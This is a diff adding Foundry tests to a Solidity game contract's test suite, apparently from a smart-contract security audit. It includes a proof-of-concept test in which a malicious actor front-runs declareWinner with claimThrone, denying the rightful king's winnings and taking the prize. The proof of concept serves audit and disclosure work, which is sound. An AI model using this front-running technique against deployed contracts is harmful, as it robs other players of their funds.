@@ -46,4 +46,66 @@ contract GameTest is Test {
         vm.expectRevert("Game: Grace period must be greater than zero.");
         new Game(INITIAL_CLAIM_FEE, 0, FEE_INCREASE_PERCENTAGE, PLATFORM_FEE_PERCENTAGE);
     }
+    //@audit-poc
+    function test_claim_throne() external {
+        uint256 amountNeededToClainThrone = game.claimFee();
+        uint256 player1Balance = player1.balance;
+        assertGt(player1Balance, amountNeededToClainThrone);
+        vm.startPrank(player1);
+        vm.expectRevert("Game: You are already the king. No need to re-claim.");
+        game.claimThrone{value: INITIAL_CLAIM_FEE}();
+        vm.stopPrank();
+    }
+
+    //@audit-poc
+    function test_FrontRun_declareWinner_To_Cause_Grief() external {
+        vm.prank(player1);
+        game.claimThrone{value: INITIAL_CLAIM_FEE}();
+
+        uint256 claimFee = game.claimFee();
+        vm.prank(player2);
+        game.claimThrone{value: claimFee}();
+
+        claimFee = game.claimFee();
+        vm.prank(player3);
+        game.claimThrone{value: claimFee}();
+
+        address currentKing = game.currentKing();
+        assertEq(currentKing, player3);
+
+        uint256 newTime = block.timestamp + game.getRemainingTime();
+
+        vm.warp(newTime + 1);
+
+        //declare winner
+        // game.declareWinner();
+        // uint256 winnerPendings = game.pendingWinnings(player3);
+        // assertGt(winnerPendings, 0); //3.144e17
+
+        //attacker supersedes this above transaction with claimThrone
+        claimFee = game.claimFee();
+        vm.prank(maliciousActor);
+        game.claimThrone{value: claimFee}();
+        currentKing = game.currentKing();
+        assertEq(currentKing, maliciousActor);
+        
+        vm.expectRevert("Game: Grace period has not expired yet.");
+        game.declareWinner();
+        uint256 winnerPendings = game.pendingWinnings(player3);
+        assertEq(winnerPendings, 0);
+
+        //attacker is required for grace period to pass meanwhile there is a chance for others to claim throne, hence causing more delays
+        
+        newTime = block.timestamp + game.getRemainingTime();
+        vm.warp(newTime + 1);
+
+        //If no one claims the throne in between then attacker becomes the kind
+        game.declareWinner();
+        winnerPendings = game.pendingWinnings(maliciousActor);
+        assertGt(winnerPendings, 0); //4.408e17
+        assertEq(currentKing, maliciousActor);
+    }
+
+
+
 }
